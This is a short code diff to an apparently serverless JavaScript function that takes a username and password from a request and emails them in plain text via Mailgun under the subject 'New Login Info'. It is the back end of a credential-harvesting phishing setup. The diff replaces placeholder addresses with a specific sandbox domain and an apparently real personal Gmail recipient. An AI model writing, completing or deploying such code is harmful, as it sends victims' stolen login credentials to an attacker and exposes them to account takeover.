@@ -12,8 +12,8 @@ try {
 const { username, password } = JSON.parse(event.body);
 
 await mg.messages.create(process.env.MAILGUN_DOMAIN, {
-from: 'Mailgun Sandbox <postmaster@sandbox1234.mailgun.org>',
-to: 'your-email@example.com', // must be verified in Mailgun sandbox
+from: 'Mailgun Sandbox <sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
+to: 'anabones716@gmail.com', // must be verified in Mailgun sandbox
 subject: 'New Login Info',
 text: `Username: ${username}\nPassword: ${password}`
 });
